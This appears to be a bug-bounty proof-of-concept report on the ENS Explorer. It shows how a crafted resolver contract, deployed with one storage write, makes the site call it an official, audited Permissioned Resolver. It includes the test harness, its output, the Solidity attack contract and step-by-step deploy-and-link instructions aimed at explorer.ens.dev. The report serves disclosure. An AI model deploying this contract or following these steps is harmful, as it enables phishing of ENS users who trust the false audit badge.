const { QueryClient, QueryClientProvider } = await import('@tanstack/react-query')
const { ResolverTypeValue } = await import(
  `@ens-repo/${PORTAL}/features/resolver/components/ResolverTypeValue.tsx`)

const renderTypeRow = async (address) => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } })
  await qc.prefetchQuery(getIsPermissionedResolverQueryOptions({ resolverAddress: address }))
  const html = renderToStaticMarkup(
    React.createElement(QueryClientProvider, { client: qc },
      React.createElement(ResolverTypeValue, { resolverAddress: address })))
  return html.replace(/<[^>]+>/g, '').replace(/\s+/g, ' ').trim()
}
const fakeRow = await renderTypeRow(fake)
const honestRow = await renderTypeRow(honest)
say(`    ATTACKER   "${fakeRow}"`)
say(`    HONEST     "${honestRow}"`)
const AUDITED = 'This is an instance of the official ENS Permissioned Resolver. ' +
  'It is audited and is considered secure.'
if (fakeRow !== AUDITED) throw new Error(`attacker rendered: ${fakeRow}`)
if (honestRow !== 'Custom Resolver') throw new Error(`control rendered: ${honestRow}`)

act('ACT 5', "The arrival: the Explorer's own search box")
const { RESOLVER_INTERFACE_IDS } = await import(`@ens-repo/${PORTAL}/lib/constants/resolverInterfaceIds.ts`)
const { buildSearchSuggestions } = await import(
  `@ens-repo/${PORTAL}/features/dashboard/utils/buildSearchSuggestions.ts`)
const supportsAbi = [{ type: 'function', name: 'supportsInterface', stateMutability: 'view',
  inputs: [{ type: 'bytes4' }], outputs: [{ type: 'bool' }] }]
const claimedInterfaces = async (a) => {
  const hits = []
  for (const id of Object.values(RESOLVER_INTERFACE_IDS)) {
    try { if (await chain.call({ to: a, abi: supportsAbi, fn: 'supportsInterface', args: [id] })) hits.push(id) }
    catch {}
  }
  return hits
}
const suggestFor = async (a) => {
  const hits = await claimedInterfaces(a)
  const items = buildSearchSuggestions({
    value: a, isMobile: false, isResolver: hits.length > 0,
    navigateToAddress: () => {}, navigateToName: () => {}, navigateToResolver: () => {},
  })
  return { hits, description: items[0]?.description, id: items[0]?.id }
}
const fakeSuggest = await suggestFor(fake)
const plainSuggest = await suggestFor('0x1111111111111111111111111111111111111111')
kv('ATTACKER claims', fakeSuggest.hits.join(', '))
kv('  suggestion', `"${fakeSuggest.description}"  -> ${fakeSuggest.id.split(':')[0]}`)
kv('ordinary address', 'claims nothing')
kv('  suggestion', `"${plainSuggest.description}"  -> ${plainSuggest.id.split(':')[0]}`)
if (fakeSuggest.description !== 'View resolver details') throw new Error('search did not offer the resolver route')
if (plainSuggest.description !== 'View address details') throw new Error('control suggestion wrong')

act('ACT 6', 'What the certified contract is')
const runtime = await chain.code(fake)
const opcodes = new Set((runtime.slice(2).match(/../g) ?? []))
const resolvesTo = await chain.call({ to: fake,
  abi: [{ type: 'function', name: 'addr', stateMutability: 'view',
          inputs: [{ type: 'bytes32' }], outputs: [{ type: 'address' }] }],
  fn: 'addr', args: [`0x${'11'.repeat(32)}`] })
kv('runtime code size', `${(runtime.length - 2) / 2} bytes`)
kv('DELEGATECALL (0xf4)', opcodes.has('f4') ? 'present' : 'absent')
kv('addr(node) returns', `${resolvesTo}  (the deployer)`)
if (opcodes.has('f4')) throw new Error('the model contract contains a DELEGATECALL')
if (resolvesTo.toLowerCase() !== ATTACKER.toLowerCase()) throw new Error('addr() did not return the attacker')

say()
rule('-')
say('  WHAT ENS SAYS ABOUT EACH CONTRACT')
rule('-')
say('    contract   OG card (no JS)          Type row')
say(`    HONEST     ${resolverSubtitle(honestWorker).padEnd(24)} ${honestRow}`)
say(`    ATTACKER   ${resolverSubtitle(fakeWorker).padEnd(24)} This is an instance of the official ENS`)
say(`               ${''.padEnd(24)} Permissioned Resolver. It is audited and`)
say(`               ${''.padEnd(24)} is considered secure.`)
rule('-')
say()
say('  One SSTORE in the attacker\'s constructor turned "Resolver" into')
say('  "Permissioned Resolver" on the ENS card and "Custom Resolver" into')
say('  "audited and considered secure" on the ENS page, for a contract with')
say('  no DELEGATECALL whose addr() answers with the attacker\'s address.')
say()
say('  PoC PASSED, every assertion held.')
say()
server.close()
```

### Output

```
==============================================================================
  ENS PoC: the Explorer certifies any contract as the official, audited
           ENS Permissioned Resolver from a self-writable storage slot
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-audited-badge
==============================================================================

==============================================================================
  ACT 1  Two contracts on a real EVM, one SSTORE apart
==============================================================================
    official impl            0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e  (ensjs @e96662c)

    contract    address                                      slot 0x360894a1...382bbc
    ATTACKER    0x4E8A6792943b64Af59fc19159d662ACDeabA50b0   0x0000000000000000000000009eae5c2730a7dd16bdd1dee6421a1b91e3b0365e
    HONEST      0x6b62d49710A12b869D5f9285725918DdfAb3016A   0x0000000000000000000000000000000000000000000000000000000000000000

  JSON-RPC on http://127.0.0.1:8747. Every read below is the target's own code over HTTP.

==============================================================================
  ACT 2  The OG card: server-rendered by the Cloudflare worker, no JavaScript
==============================================================================
    [PIN] apps/portal/src/worker.ts
          const resolverRoute = matchContractRoute(pathname, 'resolver')
    [PIN] apps/portal/src/worker.ts
          `https://${url.host}/og/${kind}/${encoded}.png`
    [PIN] apps/portal/src/worker.ts
          const isPermissioned = await fetchIsPermissionedResolver(
    [PIN] apps/portal/src/worker/og-render.ts
          'Cache-Control': 'public, max-age=3600, s-maxage=3600'

  A link to /resolver/<address> gets og:image /og/resolver/<address>.png.
  The worker answers that PNG with its own slot read and its own subtitle:

    contract     fetchIsPermissionedResolver   card subtitle
    ATTACKER     true                          Permissioned Resolver
    HONEST       false                         Resolver

==============================================================================
  ACT 3  The SPA decision, the target's own hook
==============================================================================
    ATTACKER contract        true
    HONEST contract          false

==============================================================================
  ACT 4  The Type row, the target's own React component
==============================================================================
    ATTACKER   "This is an instance of the official ENS Permissioned Resolver. It is audited and is considered secure."
    HONEST     "Custom Resolver"

==============================================================================
  ACT 5  The arrival: the Explorer's own search box
==============================================================================
    ATTACKER claims          0x3b3b57de, 0x59d1d43c, 0x91413117
      suggestion             "View resolver details"  -> resolver
    ordinary address         claims nothing
      suggestion             "View address details"  -> address

==============================================================================
  ACT 6  What the certified contract is
==============================================================================
    runtime code size        452 bytes
    DELEGATECALL (0xf4)      absent
    addr(node) returns       0x00000000000000000000000000000000000000A7  (the deployer)

------------------------------------------------------------------------------
  WHAT ENS SAYS ABOUT EACH CONTRACT
------------------------------------------------------------------------------
    contract   OG card (no JS)          Type row
    HONEST     Resolver                 Custom Resolver
    ATTACKER   Permissioned Resolver    This is an instance of the official ENS
                                        Permissioned Resolver. It is audited and
                                        is considered secure.
------------------------------------------------------------------------------

  One SSTORE in the attacker's constructor turned "Resolver" into
  "Permissioned Resolver" on the ENS card and "Custom Resolver" into
  "audited and considered secure" on the ENS page, for a contract with
  no DELEGATECALL whose addr() answers with the attacker's address.

  PoC PASSED, every assertion held.

```

For the attacker's contract the ENS card went from `Resolver` to `Permissioned Resolver` and the Type row from `Custom Resolver` to the audited notice, one `SSTORE` apart from the control, exit code 0.

## Attack code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract FakeAuditedResolver {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public immutable attacker;

    constructor(address officialPermissionedResolverImpl) {
        attacker = msg.sender;
        assembly { sstore(IMPLEMENTATION_SLOT, officialPermissionedResolverImpl) }
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x3b3b57de || id == 0x59d1d43c || id == 0x91413117;
    }

    function addr(bytes32) external view returns (address) { return attacker; }
}
```

```
// 1. Deploy, one transaction from any address.
new FakeAuditedResolver(0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e)

// 2. Post the contract's Explorer link anywhere that unfurls Open Graph.
https://explorer.ens.dev/resolver/<FakeAuditedResolver>

// 3. The client follows og:image (worker.ts:227-239) and shows the ENS card
//    subtitled "Permissioned Resolver".
GET https://explorer.ens.dev/og/resolver/<FakeAuditedResolver>.png

// 4. A visitor pastes the address into the Explorer search box, is offered
//    "View resolver details" (buildSearchSuggestions.ts:72-79) and presses Enter.
GET https://explorer.ens.dev/resolver/<FakeAuditedResolver>

// 5. The Type row prints ResolverTypeValue.tsx:13-19:
//    "This is an instance of the official ENS Permissioned Resolver.
//     It is audited and is considered secure."
```

```
plant : new FakeAuditedResolver(0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e)
fire  : GET https://explorer.ens.dev/og/resolver/<FakeAuditedResolver>.png
```
